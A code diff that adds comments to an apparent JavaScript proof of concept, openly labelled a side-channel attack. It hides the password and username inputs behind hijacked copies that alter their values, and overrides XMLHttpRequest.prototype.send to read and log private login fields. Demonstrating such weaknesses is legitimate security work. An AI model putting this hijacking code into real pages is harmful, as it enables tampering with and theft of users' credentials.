@@ -24,6 +24,10 @@
     };
     // side-channel attack to modify private-fields in hijacked dom-inputs
     ['inputPassword', 'inputUsername'].forEach(function (element) {
+    /*
+     * this function will hide the original dom-inputs from the user,
+     * and replace them with hijacked ones, that can arbitrarily modify data
+     */
         var hijackElement;
         element = document.querySelector('#' + element);
         element.style.display = 'none';
@@ -33,6 +37,7 @@
         hijackElement.type = element.type;
         hijackElement.value = element.value;
         hijackElement.addEventListener('change', function () {
+            // arbitrarily modify data and pass it back to original dom-inputs
             element.value = hijackElement.value + ' modified!';
         });
         element.value = element.value + ' modified!';
@@ -46,6 +51,9 @@
     // side-channel attack to read private-fields from hijacked XMLHttpRequest
     XMLHttpRequestPrototypeSend = XMLHttpRequest.prototype.send;
     XMLHttpRequest.prototype.send = function (data) {
+    /*
+     * this function will hijack XMLHttpRequest.prototype.send to indirectly read private-fields
+     */
         try {
             data = JSON.parse(data);
             console.log('hijacked XMLHttpRequest.prototype.send to read field ' +
